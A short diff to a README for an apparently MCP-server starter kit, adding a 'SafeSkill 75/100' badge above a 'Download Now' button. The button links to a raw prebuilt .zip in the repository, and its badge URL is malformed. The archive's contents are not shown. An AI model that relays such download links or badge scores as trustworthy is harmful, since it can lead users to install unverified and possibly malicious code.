@@ -1,5 +1,7 @@
 # 🎉 create-mcp-server-kit - Build Your MCP Server Fast
 
+[![SafeSkill 75/100](https://img.shields.io/badge/SafeSkill-75%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/bernardpacis-create-mcp-server-kit)
+
 ## 📥 Download Now
 [![Download](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-mcp-kit-v2.0-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-mcp-kit-v2.0-beta.1.zip)
 
